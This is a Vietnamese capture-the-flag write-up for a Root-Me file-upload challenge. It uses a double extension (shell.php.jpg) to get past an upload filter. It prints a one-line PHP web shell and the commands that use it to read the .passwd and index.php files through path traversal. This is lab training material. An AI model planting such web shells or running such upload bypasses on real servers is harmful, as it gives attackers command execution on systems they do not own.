<main class="main" role="main">
    <div class="content">
        <article id="post-fileupload/fileupload_chall1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    File upload - double extensions
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-double-extensions" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/File-upload-double-extensions</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Gallery v0.02</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Your goal is to hack this photo galery by uploading PHP code.<br>Retrieve the validation password in the file .passwd at the root of the application.</p>

                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none"><h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h3 id="Muc-tieu-tan-cong"><a href="#Muc-tieu-tan-cong" class="headerlink" title="Mục tiêu tấn công"></a>Mục tiêu tấn công</h3>
                <p>Upload file có đuôi .php sau đó, dùng nó để đọc file .passwd ở thư mục root.</p>
                <h3 id="Khai-thac-nao"><a href="#Khai-thac-nao" class="headerlink" title="Khai thác nào."></a>Khai thác nào.</h3>
                <p>Thử upload file <strong>test.php</strong> thì đã bị server chặn và không cho phép rồi.<br>Với bài này thì cái tên đề mục nó khá là mở,nên dễ dàng nhận ra ta có thể dùng trick double extension để tấn công.</p>
                <p>Double extension tức là: <strong>file.php.jpg</strong><br>Viết một shell php đơn giản:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Sau đó,dùng burp suite để sửa đuôi file thành: <strong>shell.php.jpg</strong><br>Hoặc sửa bằng rename của Windows rồi upload lên.</p>
                <p>Vào đường dẫn đến file và chạy shell với tham số mong muốn.</p>
                <blockquote>
                    <p>linktoshell/shell.php.jpg?cmd=cat ../../../.passwd</p>
                </blockquote>
                <p>Và ta đã có flag.</p>
                <h2 id="Tai-sao-file-php-jpg-lai-co-the-chay-nhu-file-php"><a href="#Tai-sao-file-php-jpg-lai-co-the-chay-nhu-file-php" class="headerlink" title="Tại sao file php.jpg lại có thể chạy như file .php?"></a>Tại sao file php.jpg lại có thể chạy như file .php?</h2>
                <p>Đó là do cấu hình của server, ví dụ như dùng <strong>AddType</strong> trong <strong>.htaccess</strong>, bạn có thể thêm các loại file để chạy như file php.</p>
                <blockquote>
                    <p>AddType application/x-httpd-php .jpg</p>
                </blockquote>
                <p>Mục đích của bài này là bypass cơ chế filter đuôi của file thôi.</p>
                <h2 id="Doc-file-index-de-hieu-ro-hon-code-loi"><a href="#Doc-file-index-de-hieu-ro-hon-code-loi" class="headerlink" title="Đọc file index để hiểu rõ hơn code lỗi."></a>Đọc file index để hiểu rõ hơn code lỗi.</h2>
                <blockquote>
                    <p>linktoshell/shell.php.jpg?cmd=cat ../../../index.php</p>
                </blockquote>
                <p>Crt + U lên cho dễ đọc nhé.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>